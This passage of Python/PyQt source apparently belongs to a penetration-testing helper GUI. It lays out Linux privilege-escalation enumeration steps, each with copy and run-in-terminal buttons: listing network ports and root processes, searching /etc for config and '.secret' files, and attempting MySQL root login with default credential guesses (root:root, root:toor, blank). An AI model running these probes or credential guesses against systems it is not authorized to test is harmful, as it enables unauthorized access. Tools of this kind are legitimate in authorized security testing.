        self.tab3_container_layout.insertWidget(66, self.lpe_pspy_divider2)
        self.tab3_container_layout.insertWidget(67, self.lpe_pspy_spacer2)
        self.tab3_container_layout.addStretch()

# netstat
        if hasattr(self, 'netstat'):
            self.tab3_container_layout.removeWidget(self.netstat)
            self.netstat.deleteLater()
        self.netstat = QLabel("[+ What does the local network look like?]")
        self.netstat.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(68,self.netstat)

        # netstat_Scan1
        if hasattr(self, 'netstat_Scan1'):
            self.tab3_container_layout.removeWidget(self.netstat_Scan1)
            self.netstat_Scan1.deleteLater()
        self.netstat_Scan1 = QLabel(f"netstat -antup")
        self.netstat_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # netstat_Scan1 copy button
        if hasattr(self, 'netstat_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.netstat_Scan1_Copy)
            self.netstat_Scan1_Copy.deleteLater()
        self.netstat_Scan1_Copy = QPushButton()
        self.netstat_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.netstat_Scan1_Copy.setFixedSize(QSize(20,20))
        self.netstat_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.netstat_Scan1.text()))
        self.netstat_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # netstat_Scan1 run button
        if hasattr(self, 'netstat_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.netstat_Scan1_Run)
            self.netstat_Scan1_Run.deleteLater()
        self.netstat_Scan1_Run = QPushButton()
        self.netstat_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.netstat_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.netstat_Scan1.text() + "; bash"
        self.netstat_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.netstat_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # netstat_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.netstat_Scan1_Copy)
        label_layout.addWidget(self.netstat_Scan1_Run)
        label_layout.addWidget(self.netstat_Scan1)
        self.tab3_container_layout.insertLayout(69, label_layout)
        self.tab3_container_layout.addStretch()

        # netstat_Scan2
        if hasattr(self, 'netstat_Scan2'):
            self.tab3_container_layout.removeWidget(self.netstat_Scan2)
            self.netstat_Scan2.deleteLater()
        self.netstat_Scan2 = QLabel(f"netstat -tunlp")
        self.netstat_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # netstat_Scan2 copy button
        if hasattr(self, 'netstat_Scan2_Copy'):
            self.tab3_container_layout.removeWidget(self.netstat_Scan2_Copy)
            self.netstat_Scan2_Copy.deleteLater()
        self.netstat_Scan2_Copy = QPushButton()
        self.netstat_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.netstat_Scan2_Copy.setFixedSize(QSize(20,20))
        self.netstat_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.netstat_Scan2.text()))
        self.netstat_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # netstat_Scan2 run button
        if hasattr(self, 'netstat_Scan2_Run'):
            self.tab3_container_layout.removeWidget(self.netstat_Scan2_Run)
            self.netstat_Scan2_Run.deleteLater()
        self.netstat_Scan2_Run = QPushButton()
        self.netstat_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.netstat_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.netstat_Scan2.text() + "; bash"
        self.netstat_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.netstat_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # netstat_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.netstat_Scan2_Copy)
        label_layout.addWidget(self.netstat_Scan2_Run)
        label_layout.addWidget(self.netstat_Scan2)
        self.tab3_container_layout.insertLayout(70, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_netstat_divider 1
        if hasattr(self, 'lpe_netstat_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_netstat_divider1)
            self.lpe_netstat_divider1.deleteLater()
        self.lpe_netstat_divider1 = QFrame()
        self.lpe_netstat_divider1.setFrameShape(QFrame.HLine)
        self.lpe_netstat_divider1.setLineWidth(3)
        self.lpe_netstat_divider1.setStyleSheet("color: #20C20E;")

        # lpe_netstat_divider2
        if hasattr(self, 'lpe_netstat_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_netstat_divider2)
            self.lpe_netstat_divider2.deleteLater()
        self.lpe_netstat_divider2 = QFrame()
        self.lpe_netstat_divider2.setFrameShape(QFrame.HLine)
        self.lpe_netstat_divider2.setLineWidth(3)
        self.lpe_netstat_divider2.setStyleSheet("color: #20C20E;")

        # lpe_netstat_spacer1
        if hasattr(self, 'lpe_netstat_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_netstat_spacer1)
            self.lpe_netstat_spacer1.deleteLater()
        self.lpe_netstat_spacer1 = QLabel()
        self.lpe_netstat_spacer1.setFixedWidth(40)
        self.lpe_netstat_spacer1.setFixedHeight(50)

        # lpe_netstat_spacer2
        if hasattr(self, 'lpe_netstat_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_netstat_spacer2)
            self.lpe_netstat_spacer2.deleteLater()
        self.lpe_netstat_spacer2 = QLabel()
        self.lpe_netstat_spacer2.setFixedWidth(40)
        self.lpe_netstat_spacer2.setFixedHeight(50)

        # lpe_netstat_spacer & divider layout
        self.tab3_container_layout.insertWidget(71, self.lpe_netstat_spacer1)
        self.tab3_container_layout.insertWidget(72, self.lpe_netstat_divider1)
        self.tab3_container_layout.insertWidget(73, self.lpe_netstat_divider2)
        self.tab3_container_layout.insertWidget(74, self.lpe_netstat_spacer2)
        self.tab3_container_layout.addStretch()

# lpe_ps
        if hasattr(self, 'lpe_ps'):
            self.tab3_container_layout.removeWidget(self.lpe_ps)
            self.lpe_ps.deleteLater()
        self.lpe_ps = QLabel("[+ Is anything vulnerable running as root?]")
        self.lpe_ps.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(75,self.lpe_ps)

        # lpe_ps_Scan1
        if hasattr(self, 'lpe_ps_Scan1'):
            self.tab3_container_layout.removeWidget(self.lpe_ps_Scan1)
            self.lpe_ps_Scan1.deleteLater()
        self.lpe_ps_Scan1 = QLabel(f"ps aux |grep -i 'root' --color=auto")
        self.lpe_ps_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_ps_Scan1 copy button
        if hasattr(self, 'lpe_ps_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_ps_Scan1_Copy)
            self.lpe_ps_Scan1_Copy.deleteLater()
        self.lpe_ps_Scan1_Copy = QPushButton()
        self.lpe_ps_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_ps_Scan1_Copy.setFixedSize(QSize(20,20))
        self.lpe_ps_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_ps_Scan1.text()))
        self.lpe_ps_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_ps_Scan1 run button
        if hasattr(self, 'lpe_ps_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_ps_Scan1_Run)
            self.lpe_ps_Scan1_Run.deleteLater()
        self.lpe_ps_Scan1_Run = QPushButton()
        self.lpe_ps_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_ps_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_ps_Scan1.text() + "; bash"
        self.lpe_ps_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_ps_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_ps_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_ps_Scan1_Copy)
        label_layout.addWidget(self.lpe_ps_Scan1_Run)
        label_layout.addWidget(self.lpe_ps_Scan1)
        self.tab3_container_layout.insertLayout(76, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_ps_divider 1
        if hasattr(self, 'lpe_ps_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_ps_divider1)
            self.lpe_ps_divider1.deleteLater()
        self.lpe_ps_divider1 = QFrame()
        self.lpe_ps_divider1.setFrameShape(QFrame.HLine)
        self.lpe_ps_divider1.setLineWidth(3)
        self.lpe_ps_divider1.setStyleSheet("color: #20C20E;")

        # lpe_ps_divider2
        if hasattr(self, 'lpe_ps_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_ps_divider2)
            self.lpe_ps_divider2.deleteLater()
        self.lpe_ps_divider2 = QFrame()
        self.lpe_ps_divider2.setFrameShape(QFrame.HLine)
        self.lpe_ps_divider2.setLineWidth(3)
        self.lpe_ps_divider2.setStyleSheet("color: #20C20E;")

        # lpe_ps_spacer1
        if hasattr(self, 'lpe_ps_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_ps_spacer1)
            self.lpe_ps_spacer1.deleteLater()
        self.lpe_ps_spacer1 = QLabel()
        self.lpe_ps_spacer1.setFixedWidth(40)
        self.lpe_ps_spacer1.setFixedHeight(50)

        # lpe_ps_spacer2
        if hasattr(self, 'lpe_ps_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_ps_spacer2)
            self.lpe_ps_spacer2.deleteLater()
        self.lpe_ps_spacer2 = QLabel()
        self.lpe_ps_spacer2.setFixedWidth(40)
        self.lpe_ps_spacer2.setFixedHeight(50)

        # lpe_ps_spacer & divider layout
        self.tab3_container_layout.insertWidget(77, self.lpe_ps_spacer1)
        self.tab3_container_layout.insertWidget(78, self.lpe_ps_divider1)
        self.tab3_container_layout.insertWidget(79, self.lpe_ps_divider2)
        self.tab3_container_layout.insertWidget(80, self.lpe_ps_spacer2)
        self.tab3_container_layout.addStretch()

# lpe_mysql
        if hasattr(self, 'lpe_mysql'):
            self.tab3_container_layout.removeWidget(self.lpe_mysql)
            self.lpe_mysql.deleteLater()
        self.lpe_mysql = QLabel("[+ MYSQL Credentials? Root Unauthorized Access?]")
        self.lpe_mysql.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(81,self.lpe_mysql)

        # lpe_mysql_Scan1
        if hasattr(self, 'lpe_mysql_Scan1'):
            self.tab3_container_layout.removeWidget(self.lpe_mysql_Scan1)
            self.lpe_mysql_Scan1.deleteLater()
        self.lpe_mysql_Scan1 = QLabel(f"mysql -uroot -p")
        self.lpe_mysql_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_mysql_Scan1 copy button
        if hasattr(self, 'lpe_mysql_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_mysql_Scan1_Copy)
            self.lpe_mysql_Scan1_Copy.deleteLater()
        self.lpe_mysql_Scan1_Copy = QPushButton()
        self.lpe_mysql_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_mysql_Scan1_Copy.setFixedSize(QSize(20,20))
        self.lpe_mysql_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_mysql_Scan1.text()))
        self.lpe_mysql_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_mysql_Scan1 run button
        if hasattr(self, 'lpe_mysql_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_mysql_Scan1_Run)
            self.lpe_mysql_Scan1_Run.deleteLater()
        self.lpe_mysql_Scan1_Run = QPushButton()
        self.lpe_mysql_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_mysql_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_mysql_Scan1.text() + "; bash"
        self.lpe_mysql_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_mysql_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_mysql_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_mysql_Scan1_Copy)
        label_layout.addWidget(self.lpe_mysql_Scan1_Run)
        label_layout.addWidget(self.lpe_mysql_Scan1)
        self.tab3_container_layout.insertLayout(82, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_mysql_Scan2
        if hasattr(self, 'lpe_mysql_Scan2'):
            self.tab3_container_layout.removeWidget(self.lpe_mysql_Scan2)
            self.lpe_mysql_Scan2.deleteLater()
        self.lpe_mysql_Scan2 = QLabel(f"root : root")
        self.lpe_mysql_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_mysql_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_mysql_Scan2)
        self.tab3_container_layout.insertLayout(83, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_mysql_Scan3
        if hasattr(self, 'lpe_mysql_Scan3'):
            self.tab3_container_layout.removeWidget(self.lpe_mysql_Scan3)
            self.lpe_mysql_Scan3.deleteLater()
        self.lpe_mysql_Scan3 = QLabel(f"root : toor")
        self.lpe_mysql_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_mysql_Scan3 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_mysql_Scan3)
        self.tab3_container_layout.insertLayout(84, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_mysql_Scan4
        if hasattr(self, 'lpe_mysql_Scan4'):
            self.tab3_container_layout.removeWidget(self.lpe_mysql_Scan4)
            self.lpe_mysql_Scan4.deleteLater()
        self.lpe_mysql_Scan4 = QLabel(f"root : ")
        self.lpe_mysql_Scan4.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_mysql_Scan4 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_mysql_Scan4)
        self.tab3_container_layout.insertLayout(85, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_mysql_divider 1
        if hasattr(self, 'lpe_mysql_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_mysql_divider1)
            self.lpe_mysql_divider1.deleteLater()
        self.lpe_mysql_divider1 = QFrame()
        self.lpe_mysql_divider1.setFrameShape(QFrame.HLine)
        self.lpe_mysql_divider1.setLineWidth(3)
        self.lpe_mysql_divider1.setStyleSheet("color: #20C20E;")

        # lpe_mysql_divider2
        if hasattr(self, 'lpe_mysql_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_mysql_divider2)
            self.lpe_mysql_divider2.deleteLater()
        self.lpe_mysql_divider2 = QFrame()
        self.lpe_mysql_divider2.setFrameShape(QFrame.HLine)
        self.lpe_mysql_divider2.setLineWidth(3)
        self.lpe_mysql_divider2.setStyleSheet("color: #20C20E;")

        # lpe_mysql_spacer1
        if hasattr(self, 'lpe_mysql_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_mysql_spacer1)
            self.lpe_mysql_spacer1.deleteLater()
        self.lpe_mysql_spacer1 = QLabel()
        self.lpe_mysql_spacer1.setFixedWidth(40)
        self.lpe_mysql_spacer1.setFixedHeight(50)

        # lpe_mysql_spacer2
        if hasattr(self, 'lpe_mysql_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_mysql_spacer2)
            self.lpe_mysql_spacer2.deleteLater()
        self.lpe_mysql_spacer2 = QLabel()
        self.lpe_mysql_spacer2.setFixedWidth(40)
        self.lpe_mysql_spacer2.setFixedHeight(50)

        # lpe_mysql_spacer & divider layout
        self.tab3_container_layout.insertWidget(86, self.lpe_mysql_spacer1)
        self.tab3_container_layout.insertWidget(87, self.lpe_mysql_divider1)
        self.tab3_container_layout.insertWidget(88, self.lpe_mysql_divider2)
        self.tab3_container_layout.insertWidget(89, self.lpe_mysql_spacer2)
        self.tab3_container_layout.addStretch()

# lpe_etc_usercreated
        if hasattr(self, 'lpe_etc_usercreated'):
            self.tab3_container_layout.removeWidget(self.lpe_etc_usercreated)
            self.lpe_etc_usercreated.deleteLater()
        self.lpe_etc_usercreated = QLabel("[+ Any files created by normal users in /etc]")
        self.lpe_etc_usercreated.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(90,self.lpe_etc_usercreated)

        # lpe_etc_usercreated_Scan1
        if hasattr(self, 'lpe_etc_usercreated_Scan1'):
            self.tab3_container_layout.removeWidget(self.lpe_etc_usercreated_Scan1)
            self.lpe_etc_usercreated_Scan1.deleteLater()
        self.lpe_etc_usercreated_Scan1 = QLabel("ls -lsaht /etc/")
        self.lpe_etc_usercreated_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_etc_usercreated_Scan1 copy button
        if hasattr(self, 'lpe_etc_usercreated_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_etc_usercreated_Scan1_Copy)
            self.lpe_etc_usercreated_Scan1_Copy.deleteLater()
        self.lpe_etc_usercreated_Scan1_Copy = QPushButton()
        self.lpe_etc_usercreated_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_etc_usercreated_Scan1_Copy.setFixedSize(QSize(20,20))
        self.lpe_etc_usercreated_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_etc_usercreated_Scan1.text()))
        self.lpe_etc_usercreated_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_etc_usercreated_Scan1 run button
        if hasattr(self, 'lpe_etc_usercreated_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_etc_usercreated_Scan1_Run)
            self.lpe_etc_usercreated_Scan1_Run.deleteLater()
        self.lpe_etc_usercreated_Scan1_Run = QPushButton()
        self.lpe_etc_usercreated_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_etc_usercreated_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_etc_usercreated_Scan1.text() + "; bash"
        self.lpe_etc_usercreated_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_etc_usercreated_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_etc_usercreated_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_etc_usercreated_Scan1_Copy)
        label_layout.addWidget(self.lpe_etc_usercreated_Scan1_Run)
        label_layout.addWidget(self.lpe_etc_usercreated_Scan1)
        self.tab3_container_layout.insertLayout(91, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_etc_usercreated_Scan2
        if hasattr(self, 'lpe_etc_usercreated_Scan2'):
            self.tab3_container_layout.removeWidget(self.lpe_etc_usercreated_Scan2)
            self.lpe_etc_usercreated_Scan2.deleteLater()
        self.lpe_etc_usercreated_Scan2 = QLabel("ls -lsaht /etc/ |grep -i '.conf' --color=auto")
        self.lpe_etc_usercreated_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_etc_usercreated_Scan2 copy button
        if hasattr(self, 'lpe_etc_usercreated_Scan2_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_etc_usercreated_Scan2_Copy)
            self.lpe_etc_usercreated_Scan2_Copy.deleteLater()
        self.lpe_etc_usercreated_Scan2_Copy = QPushButton()
        self.lpe_etc_usercreated_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_etc_usercreated_Scan2_Copy.setFixedSize(QSize(20,20))
        self.lpe_etc_usercreated_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_etc_usercreated_Scan2.text()))
        self.lpe_etc_usercreated_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_etc_usercreated_Scan2 run button
        if hasattr(self, 'lpe_etc_usercreated_Scan2_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_etc_usercreated_Scan2_Run)
            self.lpe_etc_usercreated_Scan2_Run.deleteLater()
        self.lpe_etc_usercreated_Scan2_Run = QPushButton()
        self.lpe_etc_usercreated_Scan2_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_etc_usercreated_Scan2_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_etc_usercreated_Scan2.text() + "; bash"
        self.lpe_etc_usercreated_Scan2_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_etc_usercreated_Scan2_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_etc_usercreated_Scan2 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_etc_usercreated_Scan2_Copy)
        label_layout.addWidget(self.lpe_etc_usercreated_Scan2_Run)
        label_layout.addWidget(self.lpe_etc_usercreated_Scan2)
        self.tab3_container_layout.insertLayout(92, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_etc_usercreated_Scan3
        if hasattr(self, 'lpe_etc_usercreated_Scan3'):
            self.tab3_container_layout.removeWidget(self.lpe_etc_usercreated_Scan3)
            self.lpe_etc_usercreated_Scan3.deleteLater()
        self.lpe_etc_usercreated_Scan3 = QLabel("ls -lsaht etc |grep -i '.secret' --color=auto")
        self.lpe_etc_usercreated_Scan3.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_etc_usercreated_Scan3 copy button
        if hasattr(self, 'lpe_etc_usercreated_Scan3_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_etc_usercreated_Scan3_Copy)
            self.lpe_etc_usercreated_Scan3_Copy.deleteLater()
        self.lpe_etc_usercreated_Scan3_Copy = QPushButton()
        self.lpe_etc_usercreated_Scan3_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_etc_usercreated_Scan3_Copy.setFixedSize(QSize(20,20))
        self.lpe_etc_usercreated_Scan3_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_etc_usercreated_Scan3.text()))
        self.lpe_etc_usercreated_Scan3_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_etc_usercreated_Scan3 run button
        if hasattr(self, 'lpe_etc_usercreated_Scan3_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_etc_usercreated_Scan3_Run)
            self.lpe_etc_usercreated_Scan3_Run.deleteLater()
        self.lpe_etc_usercreated_Scan3_Run = QPushButton()
        self.lpe_etc_usercreated_Scan3_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_etc_usercreated_Scan3_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_etc_usercreated_Scan3.text() + "; bash"
        self.lpe_etc_usercreated_Scan3_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_etc_usercreated_Scan3_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_etc_usercreated_Scan3 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_etc_usercreated_Scan3_Copy)
        label_layout.addWidget(self.lpe_etc_usercreated_Scan3_Run)
        label_layout.addWidget(self.lpe_etc_usercreated_Scan3)
        self.tab3_container_layout.insertLayout(93, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_usercreated_divider 1
        if hasattr(self, 'lpe_usercreated_divider1'):
            self.tab3_container_layout.removeWidget(self.lpe_usercreated_divider1)
            self.lpe_usercreated_divider1.deleteLater()
        self.lpe_usercreated_divider1 = QFrame()
        self.lpe_usercreated_divider1.setFrameShape(QFrame.HLine)
        self.lpe_usercreated_divider1.setLineWidth(3)
        self.lpe_usercreated_divider1.setStyleSheet("color: #20C20E;")

        # lpe_usercreated_divider2
        if hasattr(self, 'lpe_usercreated_divider2'):
            self.tab3_container_layout.removeWidget(self.lpe_usercreated_divider2)
            self.lpe_usercreated_divider2.deleteLater()
        self.lpe_usercreated_divider2 = QFrame()
        self.lpe_usercreated_divider2.setFrameShape(QFrame.HLine)
        self.lpe_usercreated_divider2.setLineWidth(3)
        self.lpe_usercreated_divider2.setStyleSheet("color: #20C20E;")

        # lpe_usercreated_spacer1
        if hasattr(self, 'lpe_usercreated_spacer1'):
            self.tab3_container_layout.removeWidget(self.lpe_usercreated_spacer1)
            self.lpe_usercreated_spacer1.deleteLater()
        self.lpe_usercreated_spacer1 = QLabel()
        self.lpe_usercreated_spacer1.setFixedWidth(40)
        self.lpe_usercreated_spacer1.setFixedHeight(50)

        # lpe_usercreated_spacer2
        if hasattr(self, 'lpe_usercreated_spacer2'):
            self.tab3_container_layout.removeWidget(self.lpe_usercreated_spacer2)
            self.lpe_usercreated_spacer2.deleteLater()
        self.lpe_usercreated_spacer2 = QLabel()
        self.lpe_usercreated_spacer2.setFixedWidth(40)
        self.lpe_usercreated_spacer2.setFixedHeight(50)

        # lpe_usercreated_spacer & divider layout
        self.tab3_container_layout.insertWidget(94, self.lpe_usercreated_spacer1)
        self.tab3_container_layout.insertWidget(95, self.lpe_usercreated_divider1)
        self.tab3_container_layout.insertWidget(96, self.lpe_usercreated_divider2)
        self.tab3_container_layout.insertWidget(97, self.lpe_usercreated_spacer2)
        self.tab3_container_layout.addStretch()

# lpe_misc_files
        if hasattr(self, 'lpe_misc_files'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files)
            self.lpe_misc_files.deleteLater()
        self.lpe_misc_files = QLabel("[+ Quick look in]")
        self.lpe_misc_files.setStyleSheet(
            "color: #20C20E;" +
            "font-size: 20px;" +
            "font-style: 'bold';"
        )
        self.tab3_container_layout.insertWidget(98,self.lpe_misc_files)

        # lpe_misc_files_Scan1
        if hasattr(self, 'lpe_misc_files_Scan1'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_Scan1)
            self.lpe_misc_files_Scan1.deleteLater()
        self.lpe_misc_files_Scan1 = QLabel(f"ls -lsaht /var/lib/")
        self.lpe_misc_files_Scan1.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_misc_files_Scan1 copy button
        if hasattr(self, 'lpe_misc_files_Scan1_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_Scan1_Copy)
            self.lpe_misc_files_Scan1_Copy.deleteLater()
        self.lpe_misc_files_Scan1_Copy = QPushButton()
        self.lpe_misc_files_Scan1_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_misc_files_Scan1_Copy.setFixedSize(QSize(20,20))
        self.lpe_misc_files_Scan1_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_misc_files_Scan1.text()))
        self.lpe_misc_files_Scan1_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_misc_files_Scan1 run button
        if hasattr(self, 'lpe_misc_files_Scan1_Run'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_Scan1_Run)
            self.lpe_misc_files_Scan1_Run.deleteLater()
        self.lpe_misc_files_Scan1_Run = QPushButton()
        self.lpe_misc_files_Scan1_Run.setIcon(QIcon.fromTheme("media-playback-start"))
        self.lpe_misc_files_Scan1_Run.setFixedSize(QSize(20,20))
        command10 = self.lpe_misc_files_Scan1.text() + "; bash"
        self.lpe_misc_files_Scan1_Run.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
        self.lpe_misc_files_Scan1_Run.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

        # lpe_misc_files_Scan1 adding widgets
        label_layout = QHBoxLayout()
        label_layout.addWidget(self.lpe_misc_files_Scan1_Copy)
        label_layout.addWidget(self.lpe_misc_files_Scan1_Run)
        label_layout.addWidget(self.lpe_misc_files_Scan1)
        self.tab3_container_layout.insertLayout(99, label_layout)
        self.tab3_container_layout.addStretch()

        # lpe_misc_files_Scan2
        if hasattr(self, 'lpe_misc_files_Scan2'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_Scan2)
            self.lpe_misc_files_Scan2.deleteLater()
        self.lpe_misc_files_Scan2 = QLabel(f"ls -lsaht /var/db/")
        self.lpe_misc_files_Scan2.setStyleSheet(
            "color: 'white';" +
            "font-size: 20px;" +
            "font-style: 'bold';"
            )

        # lpe_misc_files_Scan2 copy button
        if hasattr(self, 'lpe_misc_files_Scan2_Copy'):
            self.tab3_container_layout.removeWidget(self.lpe_misc_files_Scan2_Copy)
            self.lpe_misc_files_Scan2_Copy.deleteLater()
        self.lpe_misc_files_Scan2_Copy = QPushButton()
        self.lpe_misc_files_Scan2_Copy.setIcon(QIcon.fromTheme("edit-copy"))
        self.lpe_misc_files_Scan2_Copy.setFixedSize(QSize(20,20))
        self.lpe_misc_files_Scan2_Copy.clicked.connect(lambda: QApplication.clipboard().setText(self.lpe_misc_files_Scan2.text()))
        self.lpe_misc_files_Scan2_Copy.setStyleSheet(
            "*:hover{background: '#20C20e';}"
        )

